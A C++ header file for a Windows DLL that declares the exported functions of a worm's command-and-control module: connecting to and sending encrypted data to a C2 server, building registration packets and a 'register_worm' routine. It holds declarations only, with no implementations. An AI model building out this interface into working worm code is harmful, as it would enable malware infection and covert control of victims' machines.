#pragma once

#ifdef NETWORKING_EXPORTS
#define NETWORKING_API __declspec(dllexport)
#else
#define NETWORKING_API __declspec(dllimport)
#endif

extern "C" {

	/* Function to initialize sockets and connect C2 server */
	__declspec(dllexport) SOCKET connect_to_c2(const char*, const char*);

	/* Function to send data to the C2 server */
	__declspec(dllexport) int send_to_c2(char* encrypted_data, SOCKET ConnectSocket);

	/* Encryption Function */
	__declspec(dllexport) char* encryption(char*);

	/* Decryption Function */
	__declspec(dllexport) char* decryption(char*);

	/* Create packet structure */
	__declspec(dllexport) char* structure_init_message(char, const char*, const char*, const char*, const char*);

	/* main driver function for first traffic comms to C2 */
	__declspec(dllexport) int register_worm(char, char*, char*, char*, char*);
}